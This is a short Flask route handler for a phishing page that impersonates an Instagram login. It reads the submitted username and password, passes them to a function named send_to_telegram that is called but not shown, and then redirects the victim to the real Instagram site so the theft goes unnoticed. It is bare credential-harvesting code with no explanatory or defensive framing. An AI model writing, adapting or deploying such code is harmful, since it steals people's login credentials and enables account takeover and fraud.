@app.route('/login-post-url', methods=['POST'])
def handle_login():
    user = request.form.get('username')
    pw = request.form.get('password')
    
    send_to_telegram(user, pw)
    
    return redirect("https://www.instagram.com") 
